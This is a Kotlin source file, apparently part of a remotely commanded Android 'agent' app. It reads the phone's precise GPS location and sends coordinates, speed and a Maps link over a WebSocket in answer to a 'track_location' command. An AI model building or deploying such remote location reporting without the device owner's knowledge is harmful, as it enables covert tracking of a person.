package com.sentrix.agent.commands

import android.annotation.SuppressLint
import android.content.Context
import android.location.Location
import android.os.Looper
import android.util.Log
import com.google.android.gms.location.*
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import org.json.JSONObject
import kotlin.coroutines.resume

/**
 * Location commands using Fused Location Provider.
 * Works without root — requires ACCESS_FINE_LOCATION permission.
 */
object LocationCommands {

    private const val TAG                = "LocationCmds"
    private const val LOCATION_TIMEOUT   = 20_000L  // 20 seconds to get a fix

    @SuppressLint("MissingPermission")
    suspend fun trackLocation(context: Context, wsClient: WebSocketClient): String {
        val client = LocationServices.getFusedLocationProviderClient(context)

        // First try last known location (instant)
        val last = getLastLocation(client)
        if (last != null) {
            sendLocation(last, wsClient)
            return "Location sent (last known)"
        }

        // Fall back to fresh location request
        val fresh = withTimeoutOrNull(LOCATION_TIMEOUT) {
            getFreshLocation(client, context)
        }

        return if (fresh != null) {
            sendLocation(fresh, wsClient)
            "Location sent (fresh fix)"
        } else {
            wsClient.send(JSONObject().apply {
                put("type",    "result")
                put("action",  "track_location")
                put("success", false)
                put("error",   "Could not get location fix within timeout")
            })
            "Location fix timed out"
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun getLastLocation(
        client: FusedLocationProviderClient
    ): Location? = suspendCancellableCoroutine { cont ->
        client.lastLocation
            .addOnSuccessListener { loc -> cont.resume(loc) }
            .addOnFailureListener { cont.resume(null) }
    }

    @SuppressLint("MissingPermission")
    private suspend fun getFreshLocation(
        client: FusedLocationProviderClient,
        context: Context
    ): Location? = suspendCancellableCoroutine { cont ->

        val request = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, 5000
        ).setMaxUpdates(1).build()

        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                client.removeLocationUpdates(this)
                cont.resume(result.lastLocation)
            }
        }

        client.requestLocationUpdates(request, callback, Looper.getMainLooper())

        cont.invokeOnCancellation { client.removeLocationUpdates(callback) }
    }

    private fun sendLocation(location: Location, wsClient: WebSocketClient) {
        val json = JSONObject().apply {
            put("type",      "result")
            put("action",    "track_location")
            put("success",   true)
            put("latitude",  location.latitude)
            put("longitude", location.longitude)
            put("accuracy",  location.accuracy)
            put("altitude",  location.altitude)
            put("speed",     location.speed)
            put("timestamp", location.time)
            put("mapsUrl",
                "https://maps.google.com/?q=${location.latitude},${location.longitude}")
        }
        wsClient.send(json)
        Log.i(TAG, "Location sent: ${location.latitude}, ${location.longitude}")
    }
}
